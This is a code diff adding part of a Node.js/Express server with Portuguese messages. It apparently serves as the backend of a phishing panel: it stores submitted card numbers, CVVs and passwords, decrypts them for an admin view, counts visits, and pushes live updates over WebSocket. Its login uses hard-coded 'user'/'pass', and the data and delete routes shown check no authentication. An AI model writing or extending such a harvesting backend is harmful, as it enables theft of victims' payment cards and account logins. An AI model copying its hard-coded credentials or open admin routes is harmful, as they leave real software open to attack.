+
+        if (!contactNumber || !/^\+\d{10,15}$/.test(contactNumber)) {
+            console.warn('Invalid contact number format:', contactNumber.replace(/\d/g, '*'));
+            return res.status(400).json({ error: 'Número de contato inválido.' });
+        }
+
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('contact_number', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
+            [contactNumber]
+        );
+        console.log('Contact number updated:', contactNumber.replace(/\d/g, '*'));
+        res.status(200).json({ message: 'Número de contato atualizado com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/contact-number:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Register a visit
+app.post('/api/visit', async (req, res) => {
+    try {
+        console.log('Registering a visit...');
+        await pool.query(
+            `INSERT INTO visits (visited_at) VALUES (CURRENT_TIMESTAMP)`
+        );
+        console.log('Visit registered');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'VISIT_UPDATE' });
+
+        res.status(200).json({ message: 'Visita registrada com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/visit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get visits data
+app.get('/api/visits', async (req, res) => {
+    try {
+        console.log('Fetching visits data...');
+        // Get total visits
+        const totalResult = await pool.query('SELECT COUNT(*) as total FROM visits');
+        const totalVisits = totalResult.rows[0].total;
+
+        // Get recent visits (last 10)
+        const recentResult = await pool.query(
+            'SELECT * FROM visits ORDER BY visited_at DESC LIMIT 10'
+        );
+        const recentVisits = recentResult.rows;
+
+        console.log('Visits data retrieved:', { totalVisits, recentVisitsCount: recentVisits.length });
+        res.json({
+            totalVisits,
+            recentVisits
+        });
+    } catch (error) {
+        console.error('Err in /api/visits:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get all form data for admin panel
+app.get('/api/form-data', async (req, res) => {
+    try {
+        console.log('Fetching all form data...');
+        const result = await pool.query('SELECT * FROM form_data ORDER BY submitted_at DESC');
+        const rows = result.rows;
+
+        // Decrypt sensitive data before sending
+        const decryptedRows = rows.map(row => ({
+            ...row,
+            card_number: row.card_number ? decrypt(row.card_number) : null,
+            cvv: row.cvv ? decrypt(row.cvv) : null,
+            password: row.password ? decrypt(row.password) : null
+        }));
+
+        console.log('Form data retrieved:', decryptedRows.length);
+        res.json(decryptedRows);
+    } catch (error) {
+        console.error('Err in /api/form-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Delete all form data
+app.delete('/api/delete-form-data', async (req, res) => {
+    try {
+        await pool.query('DELETE FROM form_data');
+        console.log('All form data deleted');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'FORM_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados apagados com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/delete-form-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Reset visit counter
+app.delete('/api/reset-visits', async (req, res) => {
+    try {
+        await pool.query('DELETE FROM visits');
+        console.log('Visit counter reset');
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'VISIT_UPDATE' });
+
+        res.status(200).json({ message: 'Contador de visitas zerado com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/reset-visits:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Rota de login para autenticação
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === 'user' && password === 'pass') { // Substitua por credenciais seguras
+        req.session.authenticated = true;
+        res.status(200).json({ message: 'Login bem-sucedido' });
+    } else {
+        res.status(401).json({ error: 'Credenciais inválidas' });
+    }
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+    console.error('Unhandled err:', err.message);
+    res.status(500).json({ error: 'Erro interno do servidor.' });
+});
+
+// Start the server after database initialization
+async function startServer() {
+    try {
+        await connectToDatabase();
+        await initializeDatabase();
+        ENCRYPTION_KEY = await getEncryptionKey(); // Definir após inicialização
+        const server = http.createServer(app); // Corrigido para usar http
+        server.listen(port, () => {
+            console.log(`Server running on port ${port}`);
+        });
+        const wss = new WebSocket.Server({ server });
+
+        // WebSocket setup
+        wss.on('connection', (ws) => {
+            console.log('New WebSocket client connected');
+            ws.on('close', () => console.log('WebSocket client disconnected'));
+            ws.on('error', (error) => console.error('WebSocket error:', error.message));
+
+            // Enviar estado inicial
+            broadcast({ type: 'VISIT_UPDATE' });
+            broadcast({ type: 'FORM_DATA_UPDATE' });
+            broadcast({ type: 'TEMP_DATA_UPDATE' });
+        });
+
+        // Broadcast function
+        function broadcast(message) {
+            wss.clients.forEach(client => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify(message));
+                }
+            });
+        }
+    } catch (error) {
+        console.error('Failed to start server:', error.message);
+        process.exit(1);
+    }
+}
+
+// Start the application
+startServer();
